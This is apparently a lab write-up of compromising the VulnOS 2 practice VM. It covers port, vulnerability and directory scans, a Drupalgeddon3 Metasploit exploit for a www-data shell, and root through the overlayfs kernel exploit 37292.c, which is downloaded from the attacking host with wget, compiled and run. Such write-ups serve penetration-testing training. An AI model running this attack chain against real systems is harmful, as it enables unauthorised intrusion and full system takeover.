# VulnOS 2

## Enumeration

``` bash
# port scan
nmap -sC -p- 192.168.1.29
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-21 17:50 CEST
Nmap scan report for VulnOSv2.homenet.telecomitalia.it (192.168.1.29)
Host is up (0.015s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey:
|   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)
|   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)
|   256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)
|_  256 71:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 (ED25519)
80/tcp   open  http
|_http-title: VulnOSv2
6667/tcp open  irc

# vuln scan
nmap -sC --script vuln 192.168.1.29
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-21 17:51 CEST
Nmap scan report for VulnOSv2.homenet.telecomitalia.it (192.168.1.29)
Host is up (0.016s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
| http-csrf:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=VulnOSv2.homenet.telecomitalia.it
|   Found the following possible CSRF vulnerabilities:
|
|     Path: http://vulnosv2.homenet.telecomitalia.it:80/jabc/?q=node/4
|     Form id: commerce-cart-add-to-cart-form-1
|     Form action: /jabc/?q=node/4
|
|     Path: http://vulnosv2.homenet.telecomitalia.it:80/jabc/?q=node/6
|     Form id: commerce-cart-add-to-cart-form-3
|     Form action: /jabc/?q=node/6
|
|     Path: http://vulnosv2.homenet.telecomitalia.it:80/jabc/?q=node/5
|     Form id: commerce-cart-add-to-cart-form-2
|_    Form action: /jabc/?q=node/5
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-dombased-xss: Could not find any DOM based XSS.
| http-sql-injection:
|   Possible sqli for queries:
|     http://vulnosv2.homenet.telecomitalia.it:80/jabc/?q=node%2F3%27%20OR%20sqlspider
|     http://vulnosv2.homenet.telecomitalia.it:80/jabc/?q=node%2F3%27%20OR%20sqlspider
|     http://vulnosv2.homenet.telecomitalia.it:80/jabc/?q=node%2F3%27%20OR%20sqlspider
|     http://vulnosv2.homenet.telecomitalia.it:80/jabc/?q=node%2F3%27%20OR%20sqlspider
|     http://vulnosv2.homenet.telecomitalia.it:80/jabc/?q=node%2F3%27%20OR%20sqlspider
|     http://vulnosv2.homenet.telecomitalia.it:80/jabc/?q=node%2F3%27%20OR%20sqlspider
|     http://vulnosv2.homenet.telecomitalia.it:80/jabc/misc/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://vulnosv2.homenet.telecomitalia.it:80/jabc/misc/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://vulnosv2.homenet.telecomitalia.it:80/jabc/misc/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://vulnosv2.homenet.telecomitalia.it:80/jabc/misc/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://vulnosv2.homenet.telecomitalia.it:80/jabc/?q=node%2F3%27%20OR%20sqlspider
|     http://vulnosv2.homenet.telecomitalia.it:80/jabc/?q=node%2F3%27%20OR%20sqlspider
|     http://vulnosv2.homenet.telecomitalia.it:80/jabc/?q=node%2F3%27%20OR%20sqlspider
|     http://vulnosv2.homenet.telecomitalia.it:80/jabc/misc/ui/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://vulnosv2.homenet.telecomitalia.it:80/jabc/misc/ui/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://vulnosv2.homenet.telecomitalia.it:80/jabc/misc/ui/?C=M%3BO%3DA%27%20OR%20sqlspider
|_    http://vulnosv2.homenet.telecomitalia.it:80/jabc/misc/ui/?C=N%3BO%3DD%27%20OR%20sqlspider
6667/tcp open  irc
|_irc-unrealircd-backdoor: Server closed connection, possibly due to too many reconnects. Try again with argument irc-unrealircd-backdoor.wait set to 100 (or higher if you get this message again).

# nikto scan
nikto -h http://192.168.1.29
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = (unset),
	LC_ALL = (unset),
	LC_CTYPE = "UTF-8",
	LANG = (unset)
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.1.29
+ Target Hostname:    192.168.1.29
+ Target Port:        80
+ Start Time:         2024-08-21 17:52:11 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: 3c9, size: 531f36393d540, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8102 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2024-08-21 17:53:16 (GMT2) (65 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

# directory discovery
gobuster dir -u http://192.168.1.29 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.29
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 288]
/.hta                 (Status: 403) [Size: 283]
/.htpasswd            (Status: 403) [Size: 288]
/index.html           (Status: 200) [Size: 969]
/javascript           (Status: 301) [Size: 316] [--> http://192.168.1.29/javascript/]
/server-status        (Status: 403) [Size: 292]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Available port:
- 22 ssh
- 80 Apache
    - homepage with link to http://192.168.1.29/jabc/
    - /javascript via dir discovery
- 6667 IRC (?)

## Web App Analysis

- /jabc directory discoveder

``` bash
gobuster dir -u http://192.168.1.8/jabc -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.8/jabc
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 287]
/.htaccess            (Status: 403) [Size: 292]
/.htpasswd            (Status: 403) [Size: 292]
/includes             (Status: 301) [Size: 317] [--> http://192.168.1.8/jabc/includes/]
/index.php            (Status: 200) [Size: 9444]
/misc                 (Status: 301) [Size: 313] [--> http://192.168.1.8/jabc/misc/]
/modules              (Status: 301) [Size: 316] [--> http://192.168.1.8/jabc/modules/]
/profiles             (Status: 301) [Size: 317] [--> http://192.168.1.8/jabc/profiles/]
/robots.txt           (Status: 200) [Size: 1561]
/scripts              (Status: 301) [Size: 316] [--> http://192.168.1.8/jabc/scripts/]
/sites                (Status: 301) [Size: 314] [--> http://192.168.1.8/jabc/sites/]
/templates            (Status: 301) [Size: 318] [--> http://192.168.1.8/jabc/templates/]
/themes               (Status: 301) [Size: 315] [--> http://192.168.1.8/jabc/themes/]
Progress: 4614 / 4615 (99.98%)
/xmlrpc.php           (Status: 200) [Size: 42]
===============================================================
Finished
===============================================================
```

- robots.txt file with useful path
- check the available file from robots.txt

``` bash
#!/bin/bash

FILE="list.txt"     # changeme
IP="192.168.1.8"    # changeme

while IFS= read -r line; do
        # define URL
        IFS=' '
        read -ra PATH <<< "$line"
        URL="http://$IP/jabc/${PATH[1]}"
        # check
        if /usr/bin/curl -I --silent --head --fail "$URL" >> curl.out.txt; then
                echo $URL
        fi
done < "$FILE"
```

- install droopescan to enumerate Drupal: v7
- search for exploit

``` bash
searchsploit drupal                 
------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
[...]
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                       | php/webapps/44557.rb
[...]
```

- the exploit work from metasploit framework to obtain a reverse shell for user "www-data"

``` bash
www-data@VulnOSv2:/home$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privilege Escalation

- new app discovered

```
www-data@VulnOSv2:/tmp$ ls -l /var/www/html
ls -l /var/www/html
total 12
-rwxrwxrwx  1 root root  969 May  3  2016 index.html
drwxrwxrwx  9 root root 4096 Apr 16  2016 jabc
drwxrwxrwx 11 root root 4096 Apr 20  2016 jabcd0cs
www-data@VulnOSv2:/tmp$ ls -l /var/www/html/jabcd0cs
ls -l /var/www/html/jabcd0cs
total 772
-rwxrwxrwx 1 root     root      2687 Nov 27  2013 AccessLog_class.php
-rwxrwxrwx 1 root     root     15146 Nov 27  2013 COPYING
-rwxrwxrwx 1 root     root       774 Nov 27  2013 CREDITS.txt
-rwxrwxrwx 1 root     root      1566 Nov 27  2013 Category_class.php
-rwxrwxrwx 1 root     root      2324 Nov 27  2013 Department_class.php
```

- search for local vulnerability

``` bash
# file perm
www-data@VulnOSv2:/tmp$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/fusermount
/bin/su
/bin/ping6
/bin/umount
/bin/ping
/bin/mount
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/mtr
/usr/bin/at
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/bin/sudo
/usr/lib/pt_chown
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/sbin/uuidd
/usr/sbin/pppd

# writable file
find / -writable -type d 2>/dev/null
[...]

# kernek version
www-data@VulnOSv2:/tmp$ uname -na
uname -na
Linux VulnOSv2 3.13.0-24-generic #47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014 i686 i686 i686 GNU/Linux
```

- search for public exploit

``` bash
searchsploit kernel 3.13 Priv
------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
[...]
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                           | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow)      | linux/local/37293.txt
[...]
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG_X86_X32=y' Local Privilege Escalation (3)                         | linux_x86-64/local/31347.c
[...]
------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

- try for 31347.c and 37292.c

``` bash
www-data@VulnOSv2:/tmp$ wget http://192.168.1.11:8000/37292.c       ### download from attack machine

--2024-08-23 09:46:42--  http://192.168.1.11:8000/37292.c
Connecting to 192.168.1.11:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4968 (4.9K) [text/x-csrc]
Saving to: '37292.c.1'

100%[======================================>] 4,968       --.-K/s   in 0s      

2024-08-23 09:46:42 (295 MB/s) - '37292.c' saved [4968/4968]

www-data@VulnOSv2:/tmp$ gcc 37292.c -o 37292c                       ### compiling in /tmp
www-data@VulnOSv2:/tmp$ ./37292c                                    ### run exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library

# id                                                                ### get root session
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```